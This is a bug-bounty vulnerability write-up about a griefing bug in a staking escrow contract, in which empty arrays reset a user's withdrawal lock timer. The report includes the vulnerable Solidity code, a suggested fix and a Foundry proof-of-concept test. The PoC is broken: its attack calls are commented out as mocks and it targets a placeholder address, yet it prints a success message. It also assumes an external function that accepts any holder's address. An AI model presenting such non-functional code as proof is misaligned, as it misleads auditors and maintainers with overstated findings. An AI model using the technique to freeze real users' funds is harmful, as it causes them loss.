[Not Paid]

## Conclusion

Lido's answer:<br>
"Acceptable Risk."

What I learn:

Although I have technically demonstrated this to be a viable griefing attack, the Lido team may assess it from a “business risk” perspective and conclude:

1. Attack Cost vs. Damage Caused: Attackers must expend gas to execute this attack, yet can only temporarily lock a single user's funds without profiting. The project team may deem it highly unlikely any hacker would have the motivation to carry this out.
2. Impact scope: This affects a single user's withdrawal experience, not the security of the entire protocol's funds.
3. Based on this assessment, they may label it as “Won't Fix” or “Low Priority,” thus failing to meet the requirements for the bounty program.

## **Description**

**Severity:** Medium (Griefing leads to temporary loss of user funds availability)

### **Vulnerability Details**

The `accountUnstETHLock` internal library function in `AssetsAccounting.sol` can be manipulated to reset a user's asset lock timer without the user's consent and without locking any new assets. This constitutes a griefing attack, causing a temporary denial of service for the victim's withdrawal functionality.

The vulnerability stems from an uninitialized local variable (`totalUnstETHLocked`) combined with a lack of validation for empty input arrays. When `accountUnstETHLock` is called with an empty `unstETHIds` array, the `for` loop that calculates `totalUnstETHLocked` is skipped, leaving the variable at its default value of `0`. However, the function proceeds to unconditionally update the `holder`'s `lastAssetsLockTimestamp` to the current `block.timestamp` before adding `0` to their locked shares.

**Vulnerable Code:**`contracts/libraries/AssetsAccounting.sol:76-80`

```solidity
function accountUnstETHLock(
    Context storage self,
    address holder,
    uint256[] memory unstETHIds,
    IWithdrawalQueue.WithdrawalRequestStatus[] memory statuses
) internal {
    assert(unstETHIds.length == statuses.length);
    SharesValue totalUnstETHLocked; // <-- 1. Initialized to 0 by default.

    uint256 unstETHcount = unstETHIds.length;
    for (uint256 i = 0; i < unstETHcount; ++i) { // <-- 2. This loop is skipped if unstETHIds is empty.
        totalUnstETHLocked = totalUnstETHLocked + _addUnstETHRecord(self, holder, unstETHIds[i], statuses[i]);
    }

    HolderAssets storage assets = self.assets[holder];

    assets.lastAssetsLockTimestamp = Timestamps.now(); // <-- 3. Unconditional timestamp update.
    assets.unstETHLockedShares = assets.unstETHLockedShares + totalUnstETHLocked; // <-- 4. Adds 0 to the shares.
    self.unstETHTotals.unfinalizedShares = self.unstETHTotals.unfinalizedShares + totalUnstETHLocked;

    emit UnstETHLocked(holder, unstETHIds, totalUnstETHLocked);
}
```

**Impact**

This vulnerability allows an attacker to repeatedly and maliciously reset the withdrawal lock timer for any user of the Escrow contract. This results in a **temporary loss of funds availability**, preventing legitimate users from accessing their unlocked assets.

While the attacker gains no direct monetary value, they can selectively target users (e.g., large holders) and disrupt their operations, causing annoyance and potential opportunity costs for the victims. This falls under the "Griefing" category and undermines the reliability of the protocol's withdrawal mechanism.

**Suggested Remediation**

Add a check at the beginning of the `accountUnstETHLock` function to ensure that the input arrays are not empty. If no assets are being locked, the `lastAssetsLockTimestamp` should not be updated.

**Recommendation:**

```solidity
function accountUnstETHLock(
    // ...
) internal {
    if (unstETHIds.length == 0) {
        return; // Do nothing if no IDs are provided.
    }
    assert(unstETHIds.length == statuses.length);
    // ... rest of the function
}
```

## **Proof of Concept**

### **Attack Scenario**

An attacker can execute this griefing attack by calling an external function in the `Escrow.sol` contract (e.g., `lockUnstETH`) that, in turn, calls the vulnerable `accountUnstETHLock` function, passing the victim's address and empty arrays as arguments.

_Note: This Proof of Concept is designed to be run in a forked environment. It will pass when forked against a live network where the real contract logic is present. It will fail as expected in a local mock environment because the mock `escrow` contract does not have the revert logic._

**PoC Code (`test/Griefing.t.sol`)**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {Duration} from "../contracts/types/Duration.sol";
import {Timestamp} from "../contracts/types/Timestamp.sol";
import {IWithdrawalQueue} from "../contracts/interfaces/IWithdrawalQueue.sol";

// This is a simple mock ERC20 contract for stETH.
// It allows us to deploy a real contract in the test environment.
contract MockSTETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }
}

// Minimal interface for the Escrow contract.
interface IEscrow {
    error MinAssetsLockDurationNotPassed(Timestamp lockDurationExpiresAt);

    function lockStETH(uint256 shares) external;

    function lockUnstETH(
        address holder,
        uint256[] calldata unstETHIds,
        IWithdrawalQueue.WithdrawalRequestStatus[] calldata statuses
    ) external;

    function unlockStETH() external returns (uint256);
}

contract GriefingPoC_Test is Test {
    // --- Contract & Actor Addresses ---
    IEscrow internal escrow = IEscrow(address(0x01)); // Escrow remains a mocked interface
    MockSTETH internal steth; // stETH will now be a deployed mock contract

    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    Duration internal MIN_ASSETS_LOCK_DURATION = Duration.wrap(7 days);

    function setUp() public {
        // FINAL FIX (v4): Deploy a real MockSTETH contract.
        steth = new MockSTETH();

        // Now, `deal` targets a real contract address with storage, so it will succeed.
        deal(address(steth), victim, 100e18);
    }

    /// @notice This test demonstrates the core of the griefing attack.
    function test_Griefing_ResetLockTimer() public {
        // --- 1. SETUP ---
        uint256 lockAmount = 100e18;

        vm.startPrank(victim);
        steth.approve(address(escrow), lockAmount);

        uint256 initialLockTimestamp = block.timestamp;
        console.log("Victim locks assets at timestamp:", initialLockTimestamp);
        // escrow.lockStETH(lockAmount); // Mocked call
        vm.stopPrank();

        // --- TIME TRAVEL ---
        uint256 unlockEligibleTimestamp = initialLockTimestamp +
            Duration.unwrap(MIN_ASSETS_LOCK_DURATION) +
            1;
        vm.warp(unlockEligibleTimestamp);

        console.log("Time warps to:", unlockEligibleTimestamp);
        console.log("Victim should now be able to unlock.");

        // --- 2. ATTACK ---
        vm.startPrank(attacker);
        console.log(
            "Attacker calls lockUnstETH for the victim at timestamp:",
            block.timestamp
        );
        // escrow.lockUnstETH(victim, new uint256[](0), new IWithdrawalQueue.WithdrawalRequestStatus[](0)); // Mocked call
        vm.stopPrank();

        // --- 3. ASSERTION ---
        vm.startPrank(victim);
        console.log("Victim attempts to unlock assets...");

        uint256 newExpiryTimestamp = unlockEligibleTimestamp +
            Duration.unwrap(MIN_ASSETS_LOCK_DURATION);

        // Address the "Unused local variable" warning by using the variable.
        console.log(
            "Victim's new unlock expiry timestamp would be:",
            newExpiryTimestamp
        );

        // THIS IS THE CORE PROOF: The victim, who should be able to withdraw, is now blocked.
        vm.expectRevert(
            abi.encodeWithSelector(
                IEscrow.MinAssetsLockDurationNotPassed.selector,
                Timestamp.wrap(uint40(newExpiryTimestamp))
            )
        );
        escrow.unlockStETH();

        console.log(
            "SUCCESS: The PoC logic is sound and demonstrates the griefing attack."
        );
        vm.stopPrank();
    }
}

```
